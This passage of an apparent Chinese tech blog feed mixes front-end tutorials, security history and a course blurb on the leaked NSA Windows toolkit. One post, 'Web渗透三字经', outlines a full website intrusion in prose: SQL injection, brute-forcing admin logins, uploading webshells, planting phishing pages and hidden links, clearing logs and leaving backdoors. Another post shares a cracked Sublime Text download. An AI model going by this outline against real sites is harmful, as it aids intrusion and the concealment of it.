是哪一年呢？个人觉得大概是07年底左右开始吧），也许还将继续下去。这个时期的黑客组织也遵循社会发展规律，优胜劣汰，大多数黑客组织没有坚持下去，20世纪非常流行的黑客技术论坛也越来越没有人气，最终走向没落。所有门户型的漏洞披露站点，再也不公布任何漏洞相关技术细节。随着安全产业发展，黑客的功利性越来越强，黑色产业链开始成熟。在20世纪技术还不太成熟的黑客们，凡是坚持下来的，都已经成为安全领域的高级人才，要么，在安全公司贡献自己的专业技能，要么带着非常强的技术进入黑色产业。此时期的黑客群体因为互相之间缺失信任，已经不再具有开放和分享的精神，最纯粹的黑客精神实质上已经死亡。整个互联网笼罩在黑色产业链的阴影之下，每年数十亿经济损失和数千万网民受害，黑客精神的死亡，让我们没有理由不把这个时代称为黑暗时代。也许，黑客精神所代表的Open、Free、Share，真的一去不复返了！&#xA;真羡慕那个令人热血的时代，但如今依旧是互联网充满机遇的时代！&#xA;不过你知道吗？ “黑客”是有好坏之分的！白帽子、黑帽子，他们是谁：在黑客的世界中，往往用帽子的颜色来比喻黑客的好坏。白帽子，是指那些精通安全技术，工作在反黑客领域的专家们；而黑帽子，是指利用黑客技术造成破坏，甚至进行网络犯罪的群体。&#xA;白帽子和黑帽子工作的心态完全不同：正是因为白帽子和黑帽子的目标不同，所以他们在工作时的心态是完全不同的。对于黑帽子来说，只要能够找到系统的一个弱点，就可以达到入侵系统的目的；而对于白帽子来说，必须找到系统的所有弱点，不能有遗漏，才能保证系统不会出现问题。白帽子要求全面宏观、黑帽子思考问题是有选择性的、微观的：白帽子一般为企业或安全公司服务，工作的出发点就是要解决所有的安全问题，因此所看所想必然要求更加的全面、宏观；黑帽子的主要目的是要入侵系统，找到对他们有价值的数据，因此黑帽子只需要以点突破，找到对他们最有用的一点，以此渗透，因此思考问题的出发点必然是有选择性的、微观的。&#xA;从对待问题的角度来看，黑帽子是不断组合问题，白帽子是不断分解问题：黑帽子为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的，是在不断地组合问题；而白帽子在设计解决方案时，如果只看到各种问题组合后产生的效果，就会把事情变复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，再对分解后的问题逐个予以解决。这种定位的不对称，也导致了白帽子的安全工作比较难做。“破坏永远比建设容易”，白帽子选择的方法，是克服某种攻击方法，而并非抵御单次的攻击。&#xA;安全问题往往发生在一些意想不到的地方：上述一切都是理想状态，在现实世界中，存在着各种各样不可回避的问题。工程师们很喜欢一句话：“No Patch For Stupid！”，在安全领域也普遍认为：“最大的漏洞就是人！”。写得再好的程序，在有人参与的情况下，就可能会出现各种各样不可预知的情况，比如管理员的密码有可能泄露，程序员有可能关掉了安全的配置参数，等等。安全问题往往发生在一些意想不到的地方。防御技术在不断完善的同时，攻击技术也在不断地发展。这就像一场军备竞赛，看谁跑在前面。&#xA;世界安全观不仅仅讲的是黑客是理念，更多的是思想。道哥也点出安全问题的本质是信任的安全问题。一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，无法设计，也无法完成。&#xA;把握住信任条件的度，是安全的艺术魅力：在现实生活中，我们很少设想最极端的前提条件，因为极端的条件往往意味者小概率以及高成本，因此在成本有限的情况下，我们往往会根据成本来设计安全方案，并将一些可能性较大的条件作为决策的主要依据。&#xA;从另一个角度来说，一旦我们作为决策依据的条件被打破、被绕过，那么就会导致安全假设的前提条件不再可靠，变成一个伪命题。因此，把握住信任条件的度，使其恰到好处，正是设计安全方案的难点所在，也是安全这门学问的艺术魅力所在。&#xA;安全的世界里，没有一劳永逸的银弹：在解决安全问题的过程中，不可能一劳永逸，也就是说“没有银弹”。任何人想要一劳永逸地解决安全问题，都属于一相情愿，是“自己骗自己”，是不现实的。&#xA;安全是一个持续的过程。 自从互联网有了安全问题以来，攻击和防御技术就在不断碰撞和对抗的过程中得到发展。从微观上来说，在某一时期可能某一方占了上风；但是从宏观上来看，某一时期的攻击或防御技术，都不可能永远有效，永远用下去。这是因为防御技术在发展的同时，攻击技术也在不断发展，两者是互相促进的辩证关系。以不变的防御手段对抗不断发展的攻击技术，就犯了刻舟求剑的错误。在安全的领域中，没有银弹。&#xA;我的世界安全观就这么建立了吧，安全问题的本质是信任的问题。并且安全是一个持续的过程，并不存在所谓的银弹。也知道一个安全评估的过程可以分为4个阶段：资产等级划分、威胁分析、风险分析、确认解决方案。虽然懵懵懂懂但总算是读下来了，还有那几个不太懂的白帽子兵法 1.Secure By Default 原则（白名单黑名单、最小权限原则）2.纵深防御原则 3.数据和代码分离原则 4.不可预测性原则&#xA;可喜可贺的是我也拥有了一本自己的《白帽子讲Web安全》这本书了，再也不用担心图书馆的这本书会被借走了。也在慢慢接触Web安全的一些漏洞。&#xA;Web 攻击技术发展的几个阶段：①Web 1.0时代，人们更多的是关注服务器端动态脚本的安全问题，比如将一个可执行脚本（俗称webshell）上传到服务器上，从而获得权限。动态脚本语言的普及，以及 Web 技术发展初期对安全问题认知的不足导致很多“血案”的发生，同时也遗留下很多历史问题，比如PHP 语言至今仍然只能靠较好的代码规范来保证没有文件包含漏洞，而无法从语言本身杜绝此类安全问题的发生。②SQL注入的出现是Web 安全史上的一个里程碑。SQL注入最早出现在 1999年，并很快就成为Web 安全的头号大敌。通过SQL 注入攻击，可以获取很多重要的、敏感的数据，甚至能够通过数据库获取系统访问权限，这种效果并不比直接攻击系统软件差，Web 攻击一下子就流行起来。（SQL 注入漏洞至今仍然是Web 安全领域中的一个重要组成部分。）③XSS （跨站脚本攻击）的出现则是 Web 安全史上的另一个里程碑。实际上，XSS 的出现时间和SQL 注入差不多，但是真正引起人们重视则是在大概 2003年以后。在著名的是2005年的MySpace的XSS 蠕虫事件后，安全界对 XSS 的重视程度提高了很多。④随着Web 2.0 的兴起，XSS 、CSRF（跨站请求伪造） 等攻击已经变得更为强大。Web 攻击的思路也从服务器端转向了客户端，转向了浏览器和用户。黑客们天马行空的思路，覆盖了Web 的每一个环节，变得更加的多样化。⑤互联网的蓬勃发展，也催生出许多新兴的脚本语言，比如Python 、Ruby、NodeJS等，敏捷开发成为互联网的主旋律。而手机技术、移动互联网的兴起，也给HTML 5 带来了新的机遇和挑战。Web安全技术，也紧跟着互联网发展脚步，不断地演化出新的变化。（以上名词：SQL注入、XSS跨站、CSRF跨站伪请求伪造等，不明白意思没关系，先熟悉个名词吧，知道它们是WEB应用安全的重要敌人就行，后面慢慢讲解他们具体是什么，有什么危害，怎么防范）</description>
    </item>
    <item>
      <title>前端-移动端h5常用属性</title>
      <link>https://anwangtanmi.github.io/posts/3e033da95a2ab1f332e3f27b5c98a8c9/</link>
      <pubDate>Wed, 17 May 2017 18:56:24 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3e033da95a2ab1f332e3f27b5c98a8c9/</guid>
      <description>常用属性 Safari浏览器私有meta属性 UC浏览器私有meta属性 QQ浏览器私有meta属性 用了好久的apple的一些meta属性，突然想到怎么没看见像UC、QQ浏览器的，于是问了度娘，还真的是有。移动端设备主要是iOS和Android两类，从用户量来看，Safari、UC、QQ是较多的3款浏览器了，因此整理了下移动web开发常用和3种浏览器的私有meta属性。&#xA;1.常用属性 &amp;lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0,maximum-scale=1.0,minimum=1.0,user-scalable=no&#34;&amp;gt; &amp;lt;meta name=&#34;format-detection&#34; content=&#34;telephone=no, email=no&#34;&amp;gt; ‘viewport’ 设置显示方式，一般适配移动设备用来避免缩放和影响体验的滚动条 width=device-width：宽度为设备宽度 initial-scale: 初始的缩放比例 （范围从&amp;gt;0到 10 ） minimum-scale: 允许用户缩放到的最小比例 maximum-scale: 允许用户缩放到的最大比例 user-scalable: 用户是否可以手动缩放 ‘format-detection’ 忽略页面对手机号、email的识别 telephone：yes|no email：yes|no 2.Safari浏览器私有meta属性 &amp;lt;meta name=&#34;apple-mobile-web-app-capable&#34; content=&#34;yes&#34;&amp;gt; &amp;lt;meta name=&#34;apple-mobile-web-app-status-bar-style&#34; content=&#34;black&#34;&amp;gt; &amp;lt;meta name=&#34;apple-mobile-web-app-title&#34; content=&#34;APP name&#34;&amp;gt; ‘apple-mobile-web-app-capable’ 隐藏浏览器的地址栏和toolbar，页面显示为全屏，不加此meta则默认显示地址栏和toolbar content：yes|no ‘apple-mobile-web-app-status-bar-style’ content：default|black| black-translucent，即白色、黑色、灰色半透明 ‘apple-mobile-web-app-title’ 添加到主屏后的标题 3.UC浏览器私有meta属性 来源于UC开发者中心的文档 &amp;lt;meta name=&#34;screen-orientation&#34; content=&#34;landscape&#34;&amp;gt; &amp;lt;meta name=&#34;full-screen&#34; content=&#34;yes&#34;&amp;gt; &amp;lt;meta name=&#34;browsermode&#34; content=&#34;application&#34;&amp;gt; &amp;lt;meta name=&#34;layoutmode&#34; content=&#34;fitscreen&#34;&amp;gt; &amp;lt;meta name=&#34;nightmode&#34; content=&#34;disable&#34;&amp;gt; &amp;lt;meta name=&#34;</description>
    </item>
    <item>
      <title>Bootstrap navbar 背景颜色、背景图和字体颜色修改,颜色修改不显示的问题</title>
      <link>https://anwangtanmi.github.io/posts/bf81c37b3ba88b7bd26d81d8d9b5c705/</link>
      <pubDate>Fri, 12 May 2017 20:03:27 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/bf81c37b3ba88b7bd26d81d8d9b5c705/</guid>
      <description>一、背景颜色、背景图修改&#xA;我在学些JS Web开发的过程中遇到以下问题： ，这里的navbar就是我网页的“网页头部”，我用MVC开发，默认的颜色是黑色，我前段时间费了很大劲才把这个navbar的颜色修改成别的颜色，主要经验有以下（首先不管到底对不对）： （1）修改的时候不要有多余的Index文件（就是和你要测试的文件有重复类的类似文件）在你的同一个工程文件夹里； （2）修改Bootstrap.css文件里面的navbar的颜色部分，具体如下： .navbar { position: relative; min-height: 50px; margin-bottom: 1px; background-color:#D6123E; //此处是我修改的地方 background-image: url(&#34;../App_Themes/header.jpg&#34;); border: 1px solid transparent; } 但是我今天想在.navbar 里修改背景颜色的时候，用IE测试，就是无法显示我的修改结果，我费了半天劲修改.navbar -default，但是还是不能修改。无奈之下我用Chrome测试，发现我的修改已经能显示出来了，我实在是不明白IE到底什么毛病呀，后来我想是不是要清理下IE的缓存？ 于是马上清理的IE的缓存，可是依然没有反应，还是以前的颜色！！！使用Page Inspector 测试，也已经修改过来。然后再用IE测试发现IE里面显示网页也修改过来了！！ 然后再次修改.navbar 的background-color为其它颜色，发现现在IE的颜色在修改后都能及时显示出来。哎，实在不明白IE到底是什么毛病呢？？？？？？？？？ 二、字体颜色修改 背景图修改完后，navbar里面的字体的颜色默认是蓝色，和北京有点重复，这个怎么修改呢？通过google搜索bootstrap navbar font color到这个网址：http://stackoverflow.com/questions/24899720/bootstrap-navbar-cant-change-font-color 。大概意思就是我们的 bootstrap.css文件的第1009行有以下内容：&#xA;a { color: #337ab7; text-decoration: none; } 这个就是你代码里的所有“连接”的字体颜色和装饰（通常为下划线），所以我们要建立自己的css文件来屏蔽bootstrap.css文件的默认设置，我在site.css文件里面的设置如下：&#xA;.navbar a{ color:white; } 用Page Inspector 和 IE 测试，OK，但是为什么在Chrome里面又不行呢？哎，真是服了！！后来清理下缓存也能准确显示了！哎，新手到处都是坑呀&#xA;转自：http://blog.csdn.net/liuguobo/article/details/50847880&#xA;Post navigation Previous Post:关于开机出现“安装程序正在为首次使用计算机做准备”的解决方案及微软OOBE与SYSPREP的实用技巧Next Post:全球WannaCry勒索病毒爆发背后的技术漏洞 Recent Posts 暗网网址导航大全（2021年12月更新） 暗网网址合集 暗网链接 Deep Web Link Director 全球十大暗网搜索引擎 最详细的暗网教程——tor洋葱浏览器的安装和使用方法 最新darkweb暗网搜索引擎——Tordex | The Uncensored Tor Search Engine 顶级保密暗网网址分享 如何进入暗网？教程+工具 Tor 洋葱浏览器 如何进入暗网详细步骤（暗网网桥获取方法） 什么是“暗网”？我们该如何访问?</description>
    </item>
    <item>
      <title>【NSA黑客工具包】Windows 0day验证实验</title>
      <link>https://anwangtanmi.github.io/posts/8730e4e5a49bf9991e78b5c3dac7c2a6/</link>
      <pubDate>Thu, 04 May 2017 15:41:26 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/8730e4e5a49bf9991e78b5c3dac7c2a6/</guid>
      <description> 黑客组织发布出一份震惊世界的机密文档，其中包含了多个Windows 远程漏洞利用工具，此工具集覆盖大量的Windows服务 器，可以被任何人进行下载利用，攻击者可以利用工具对Windows目标主机进行溢出提权，危害极大。&#xA;目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000（没错，古董也支持）、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8， Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，基本全球70%的Windows服务器可能都暴露在危险之中，这次事件影响力堪称网络大地震！&#xA;面对这种指哪儿打哪儿的神级漏洞，锦行科技CTO.Jannock、长亭科技.Monster、腾讯玄武实验室.TK、腾讯湛泸实验室.yuange等国内相关安全专家也给出了一些想法和解决方案。微软MSRC也发布了一则风险评估公告，报告中指出微软MSRC分析了由Shadow Brokers公开提供 的大量漏洞，大多数漏洞都已经被修补。剩余的漏洞，也被验证在Windows7、Windows近期版本、Exchange2010以及Exchange较新版本中没有得到复现，不过微软MSRC强烈建议仍在使用这些产品先前版本的用户升级到更新版本。&#xA;想要了解相关防御方案，来i春秋学院吧！i春秋全网首发，为您复现真实漏洞场景，将被暴 露出的工具包搭建到虚拟环境中，用于大家学习，了解修补方案，达到安全防护的目的。&#xA;课程目标 本次实验将复现真实漏洞场景，让同学们分别从&#xA;漏洞产生原理、&#xA;漏洞攻击手法以及&#xA;如何修复漏洞这三个方面进行学习。 </description>
    </item>
    <item>
      <title>Web渗透三字经</title>
      <link>https://anwangtanmi.github.io/posts/5664f1a61abc319a9ed2ef6c7c143405/</link>
      <pubDate>Sat, 15 Apr 2017 13:46:48 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/5664f1a61abc319a9ed2ef6c7c143405/</guid>
      <description>Web渗透三字经&#xA;最近在网上看见了前辈的Web渗透三字经：&#xA;1.用搜索 找注入 2.没注入 就旁注 3.没旁注 用0day 4.没0day 扫目录 5.找后台 爆账户 6.传小马 放大马 7.拿权限 挂页面 8.放暗链 清数据 9.清日志 留后门 作为一个新人就发表一下自己的拙见，记录学习：&#xA;1. 使用Google Hack 技术，搜索目标站点可能存在的SQL注入点，一般存在数据交互的地方可能存在，可考虑用：site：url inurl：？搜索,目的利用sql注入查询数据库内容，提升权限，获得webshell 2. 当在目标主站找不到注入点时，可以在主机的其他站点（旁站）上查找漏洞，从而利用主机上的程序或者是服务所暴露的用户所在的物理路径进行入侵 3. 找不到旁注时，如果手上有0DAY漏洞，可以直接利用0DAY漏洞进行渗透 4. 没有0DAY漏洞，也可以对目标站点进行敏感文件扫描（主要是文件目录的扫描），以找到重要目录 5. 扫描到站点敏感目录后找到后台，对登录名和密码进行暴力破解 6. 由于站点可能对上传文件有各种限制，那么此时可想法上传一个具有上传功能且隐蔽性高的shell即小马，利用上传的小马，上传一个能够具有更多权限和功能的大马 7. 拿到权限后能够在目标站点上放上自己写的钓鱼页面等 8. 拿到权限后能在目标站点上的网页中添加暗链，并且清除操作数据 9. 清除记录自己一切活动的日志记录隐蔽自己，然后留下webshell以便再次访问​ 作为一个小白能力实在有限，仅请各位看个指点，完善，感谢！</description>
    </item>
    <item>
      <title>你还在为轮播图上的小点 发愁吗，请速速围观围观</title>
      <link>https://anwangtanmi.github.io/posts/f4a4c5bcc72cad2d81305fcbc5bb5d41/</link>
      <pubDate>Sun, 09 Apr 2017 23:30:54 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f4a4c5bcc72cad2d81305fcbc5bb5d41/</guid>
      <description>html 的demo如下：&#xA;css 样式： li{ color: red; font-size: 20px; float: left; list-style: disc; margin: 5px 10px; background:pink; text-indent: -20px; } li:hover{ color: black; } 只有更简单，没有最简单。</description>
    </item>
    <item>
      <title>Deeplink:web唤醒app</title>
      <link>https://anwangtanmi.github.io/posts/23263d434ca5e45d828ec9b1aa29208e/</link>
      <pubDate>Fri, 10 Mar 2017 15:40:31 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/23263d434ca5e45d828ec9b1aa29208e/</guid>
      <description>在Android平台URI主要分五个部分：scheme, authority, path, queryParameter, queryString。其中authority又分为host和port。格式如下：(url的所有字母命名只能为小写) scheme://host:port/path?qureyParameter=queryString 例如：myscheme://www.febmaple.com:80/mypath?key=mykey&#xA;在Android的Manifest配置文件中，在要启动的activity下配置项中有配置。 其中包含内容有:&#xA;&amp;lt;data android:host=&#34;&#34; android:mimeType=&#34;&#34; android:path=&#34;&#34; android:pathPattern=&#34;&#34; android:pathPrefix=&#34;&#34; android:port=&#34;&#34; android:scheme=&#34;&#34; android:ssp=&#34;&#34; android:sspPattern=&#34;&#34; android:sspPrefix=&#34;&#34;/&amp;gt; 1、web端html里写入 Click 2、android端在menifest的响应activity的intentfilter下配置,一般只需配置scheme和host即可。 3、这样手机系统自带浏览器碰到不能处理的scheme之后会发送intent给能处理的应用，因为我们的app可以处理该scheme，所以我的app得到启动。（ps：如果用webview加载html，webview碰到处理不了的scheme并不会发送intent找app处理，而系统自带浏览器是可以的，当然我们的需求就是用系统自带浏览器触发）。&#xA;Show u my code:&#xA;一、跳到app首页：新建一个app工程用webview加载所写的html，用以触发目标app。（实际需求是直接在系统浏览器里触发目标app） 1、建立html放到工程的main/assets目录下&#xA;&amp;lt;/span&amp;gt; &amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Test Schemeh1&amp;gt; &amp;lt;a href=&#34;myscheme://www.febmaple.com:80/mypath?key=mykey&#34;&amp;gt;Clicka&amp;gt; body&amp;gt; html&amp;gt; 2、webview加载本地html内容来触发目标app&#xA;wvUrl.loadUrl(&#34;file:///android_asset/test.html&#34;); 3、在app manifeset的**欢迎**activity添加intent-filter配置data标签.&#xA;&amp;lt;activity android:name=&#34;.ui.launching.DemoLaunchingActivity&#34; android:screenOrientation=&#34;portrait&#34;&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&#34;android.intent.action.MAIN&#34;/&amp;gt; &amp;lt;category android:name=&#34;android.intent.category.LAUNCHER&#34;/&amp;gt; intent-filter&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&#34;android.intent.action.VIEW&#34;/&amp;gt; &amp;lt;category android:name=&#34;android.intent.category.DEFAULT&#34;/&amp;gt; &amp;lt;category android:name=&#34;android.intent.category.BROWSABLE&#34;/&amp;gt; &amp;lt;data android:scheme=&#34;myscheme&#34;/&amp;gt; intent-filter&amp;gt; activity&amp;gt; 4、在配置好的Activity里即可获取外部跳转的参数信息。&#xA;@Override protected void onCreate(Bundle savedInstanceState) { super.</description>
    </item>
    <item>
      <title>bootstrap在线定制工具</title>
      <link>https://anwangtanmi.github.io/posts/ca558a300fe4aa1b4787e073afe37d6c/</link>
      <pubDate>Mon, 30 Jan 2017 21:52:17 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/ca558a300fe4aa1b4787e073afe37d6c/</guid>
      <description>四种最好的免费Bootstrap在线设计工具 Bootstrap带来了设计革命，本文介绍的四种免费Bootstrap在线设计工具，可视化所见所得设计网页，然后输出Html/CSS代码，其中有些甚至可以实现拖曳，也有可以设定自己的主题模板Theme。&#xA;1. Layoutit LayoutIt通过使用我们的拖放界面生成器帮助您简单快速地创建Bootstrap前端代码。它陈列出Bootstrap的每个元素和组件，你只需要用鼠标拖曳到页面上即完成设计，让您的前端编码更容易，不需要你是javascript，HTML5或CSS3的专家。所有的设计可以是响应式的CSS和流体。设计完成后，您只需下载HTML即获得自己设计的源码。 LayoutIt有四个主要菜单，Grid网格系统，这是布局Layout方面，是你首先必须选择的，是单栏 或左右分栏等；在Components组件中选择导航条；文字工作是选择”BASE CSS”，当你熟悉该工具以后，编写一个现代Html页面如同在Word里编辑文档一样方便容易。&#xA;2.Bootstrap Magic Bootstrap Magic主题生成器充分兼容Bootstrap3和AngularJS。您可以轻松快速地创建您自己的Twitter Bootstrap主题。这是可视化的，页面上陈列出所有Bootstrap的组件样式，你能够立即改变，也立即看到你改变的内容效果。您还可以从谷歌Webfont添加更棒的webfonts。他们都包含神奇的typehead字体。当你设计好自己的主题后，能够发布分享你的主题。&#xA;3. Fancyboot Fancyboot也是一个Bootstrap 简单但功能强大的定制工具，能够设计自己的主题，可以选择自己需要设计的组件，然后进行定制，设计完成后下载，没有所有不必要的复杂性。&#xA;4.Bootsnipp Bootsnipp是一个针对网页设计师的网页元素设计画廊，使用Bootstrap的人会发现这是他们设计网站是必不可少的。该设计工具虽然也是一种主题设计器，但是对每个BootStrap元素组件设计定制能力更强，能够单独对某个组件进行可视化选择设计，比如幻灯片设计可以选择上下方向变动还是左右方向。</description>
    </item>
    <item>
      <title>浅谈使用CSS遮罩与CSS线性渐变实现图片的斜线拼接</title>
      <link>https://anwangtanmi.github.io/posts/884676ce2fc4062e41ba715d8f577cbb/</link>
      <pubDate>Sat, 14 Jan 2017 11:20:33 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/884676ce2fc4062e41ba715d8f577cbb/</guid>
      <description> css mask的原理：只会把遮罩图里透明像素所对应的原图部分进行隐藏。&#xA;渐变图作为mask，置于另一张图片上面。&#xA;#mask { position: absolute; left: 0; top: 0; width: 100%; height: 100%; background: url(&#34;images/img2.jpg&#34;); background-size: cover; -webkit-mask-image: linear-gradient(120deg, transparent 50%, white 50%); } </description>
    </item>
    <item>
      <title>react native 抽屉效果</title>
      <link>https://anwangtanmi.github.io/posts/d81d7fce4cec12605efaab4f1bd24594/</link>
      <pubDate>Sun, 08 Jan 2017 20:11:44 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/d81d7fce4cec12605efaab4f1bd24594/</guid>
      <description>在react native中，我们如果想要实现android的抽屉效果其实挺简单的，因为react-native为我们提供了DrawerLayoutAndroid这个api，使我们可以用几行代码就能实现酷炫吊炸天的动画效果，我们先来看看官网的介绍 这里主要就是介绍了drawerlayoutandroid有几个重要的方法，一个使设置宽度，一个是设置动画完成的时间，另一个是设置是否要支持手势操作，由于比较简单，直接上代码：&#xA;render() { const { drawer, navigator } = this.state; const navView = React.createElement(LeftNavigtor); return ( 200} drawerLockMode=&#39;locked-closed&#39; drawerPosition={DrawerLayoutAndroid.positions.Left} renderNavigationView={() =&amp;gt; { if (drawer &amp;amp;&amp;amp; navigator) { return navView; } return null; }} ref={(drawer) =&amp;gt; { !this.state.drawer ? this.setDrawer(drawer) : null }} &amp;gt; { drawer &amp;amp;&amp;amp; paddingTop:55,backgroundColor:&#39;#FFFFFF&#39;}} initialRoute={{ id: &#39;homepage&#39;, params: {} }} ref={(navigator) =&amp;gt; { !this.state.navigator ? this.setNavigator(navigator) : null }} navigationBar={} configureScene={this.configureScene} renderScene={this._renderRoute.bind(this)} /&amp;gt; } ); } } 这里有几点要注意，如果你的视图只允许点击时才出现，那么你要配置drawerLockMode=&#39;locked-closed&#39;这个属性，并且必须使 ref={(drawer) =&amp;gt; { !</description>
    </item>
    <item>
      <title>谈谈Sublime Text 3 与 Soda Theme</title>
      <link>https://anwangtanmi.github.io/posts/a4a69fcc845139a3f6a84f6ef03a4c36/</link>
      <pubDate>Mon, 26 Dec 2016 15:35:50 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/a4a69fcc845139a3f6a84f6ef03a4c36/</guid>
      <description>1、什么是Sublime Text ？&#xA;Sublime Text 是轻量、简洁、高效、跨平台的编辑器，具有可扩展的功能，并包含大量实用插件，我们可以通过安装自己领域的插件来成倍提高工作效率。&#xA;2、Sublime Text 的官方网站？&#xA;http://www.sublimetext.com/&#xA;说明：Sublime Text 是一款收费软件，建议用于开发的机构或个人付费使用，如果只是单纯为了学习，可以使用破解版。下面给大家共享的是中文破解版的。&#xA;网盘共享地址： 链接：http://pan.baidu.com/s/1gfC5iRT 密码：9wkx&#xA;3、Sublime Text 3的使用？&#xA;从网盘提取下载解压，看到如下目录，双击sublime_text.exe即可&#xA;显示如下界面：&#xA;我们可以对它的主题进行设置, 这里介绍用插件Soda Theme来设置Sublime Text的主题效果。&#xA;4、Sublime Text 的插件官方网站：https://packagecontrol.io/&#xA;可以搜索你需要的插件，如下图：&#xA;5、soda theme 的下载与配置？&#xA;1）下载：&#xA;通过上述链接进入的theme-soda页，可以看到如下提示：&#xA;点击页面中提示的下载地址： https://github.com/buymeasoda/soda-theme ，出现下图下面按照提示下载即可：&#xA;2）配置：&#xA;Theme-Soda页的描述非常清晰，按照说明按步骤操作即可，以soda-dark主题为例：&#xA;第一步：把你下载下来的文件解压，重新命名为Theme – Soda 。&#xA;第二步：找到你的packages目录，如下图：&#xA;第三步：把Theme – Soda文件夹拷贝到Sublime Text 3\Data\Packages目录下&#xA;第四步：打开用户设置，添加你的主题效果：“theme”: “Soda Dark.sublime-theme”&#xA;保存配置文件，重新启动sublime_text.exe，效果如下图所示：&#xA;第五步：通常配合语法高亮的配色方案，如下进行下载，解压，设置&#xA;1）&#xA;2）&#xA;3）&#xA;配置文件保存后，最终效果如下所示：&#xA;总结：关于Sublime Text 3有很多提高工作效率的插件，大家可以根据需要到它的插件官方网站去下载，其他插件的下载与配置的流程与介绍的Soda Theme的操作大同小异，按照网站上的说明操作即可。</description>
    </item>
    <item>
      <title>Sass学习之路(4)——不同样式风格的输出方式</title>
      <link>https://anwangtanmi.github.io/posts/f73c6638570e2622b75edfb15148432f/</link>
      <pubDate>Mon, 12 Dec 2016 14:52:13 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f73c6638570e2622b75edfb15148432f/</guid>
      <description>因为每个前端工程师编写代码的风格都不太一样，所以Sass的编译也非常人性化的提供了不同风格的编译方式，主要分为4种。&#xA;比如下面这一段Sass代码，我们来看看在不同风格下，会编译成什么样吧：&#xA;nav { ul { margin: 0; padding: 0; list-style: none; } li { display: inline-block; } a { display: block; padding: 6px 12px; text-decoration: none; } } 1.嵌套输出 nested:&#xA;nav ul { margin: 0; padding: 0; list-style: none; } nav li { display: inline-block; } nav a { display: block; padding: 6px 12px; text-decoration: none; } 2.展开输出 expanded：&#xA;nav ul { margin: 0; padding: 0; list-style: none; } nav li { display: inline-block; } nav a { display: block; padding: 6px 12px; text-decoration: none; } 其实可以看出来和嵌套输出挺像的，只不过闭合的大括号会另起一行（个人比较喜欢这种）</description>
    </item>
    <item>
      <title>推荐几款DevTools插件</title>
      <link>https://anwangtanmi.github.io/posts/9fef1e006be81b68505275290efa1379/</link>
      <pubDate>Wed, 07 Dec 2016 17:30:35 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9fef1e006be81b68505275290efa1379/</guid>
      <description>转自：https://segmentfault.com/a/1190000000494090&#xA;Web前端开发过程中必然会用到Chrome浏览器自带的开发者工具Chrome DevTools，使用它作为Web前端开发性能调试的必备工具。就连隔壁的产品小哥都知道打开F12改一下页面元素的标签代码就能看到页面效果，这年头谁不会用Chrome开发者工具呀。&#xA;但是Chrome能做的远不止你平常用的那么简单，这一个小小的开发工具集成了很多高级的功能你未必知道。我打算把一些Chrome DevTools上使用的高级技巧写成《你不知道的Chrome DevTools》这一系列的博文，希望大家一起学习学习。&#xA;关于DevTools插件 应用于Chrome开发者工具的插件不同于普通的Chrome应用或者插件，它是给你的Chrome DevTools扩展更多的功能，方便你查看和调试web程序。它的安装方法跟Chrome应用的安装方法是一样的，可以通过Chrome应用商店或者直接crx安装文件来安装。&#xA;下面推荐几款DevTools插件，有些是博主亲自试用过的，希望对大家的开发调试有帮助。&#xA;jQuery Audit 安装地址：Chrome应用商店链接&#xA;jQuery Audit是让你可以在DevTools查看页面节点的jQuery属性和数据，方便你调试使用jQuery库的web应用。你可以在上面看到你选中的页面元素的jQuery的events、data等属性。例如，很多人都喜欢用$.data()来让jQuery节点对象缓存一些数据，通过jQuery Audit你可以很方便地看到你缓存的数据。&#xA;jQuery Audit会自动在Elements面板的最前面加上window和document对象，这对你调试全局的对象很有帮助。例如，出于对性能的考虑，当你想查看绑定在window上绑定了哪些事件的时候，jQuery Audit可以帮你找到。&#xA;其他详细的用法可以查看官方文档。&#xA;JS Runtime Inspector 安装地址：Chrome应用商店链接&#xA;JS Runtime Inspector让你可以在DevTools上直接通过关键词来搜索页面上JavaScript对象。当你想知道此时你的程序中某个JavaScript对象的属性和数据，然而你并不知道它所在哪个作用域，只知道对象名称，因而你不能在控制台用window.xxxObj的方式来访问这个对象，所以此时你可以借助JS Runtime Inspector来查找这个对象了。&#xA;如图所示，可以通过对象名称和值来匹配查找，点击搜索后会在控制台输出查找到的结果。&#xA;Devtools redirect 安装地址：Chrome应用商店链接&#xA;Devtools redirect可以帮你给页面上的网络连接重定位。事实上网络请求重定位的功能，可以用fiddler或者ngix轻松实现，但Devtools redirect可以让你直接在浏览器上配置这些重定位。&#xA;jQuery Debugger 安装地址：Chrome应用商店链接&#xA;jQuery Debugger顾名思义就是帮你debug jQuery啦:-) 它主要有两大功能：&#xA;1. 通过选择器字符串来查找页面上的某个元素，等同于你在代码里写$(&#39;ul&amp;gt;li&#39;)这样的方式。&#xA;2. 查看页面某个元素的jQuery对象属性。这有点类似前面说过的jQuery Audit插件。&#xA;Grunt DevTools 安装地址：Chrome应用商店链接&#xA;一个可以在DevTools快速运行和查看Grunt任务的插件。有了它，你就不用经常地在浏览器工具、terminal和编辑器上来回切换窗口了。&#xA;详细描述可以查看官方文档。&#xA;CoffeeScript Console 安装地址：Chrome应用商店链接&#xA;有了它，你可以在DevTools上直接执行CoffeeScript和JavaScript之间的代码转换。&#xA;Angular 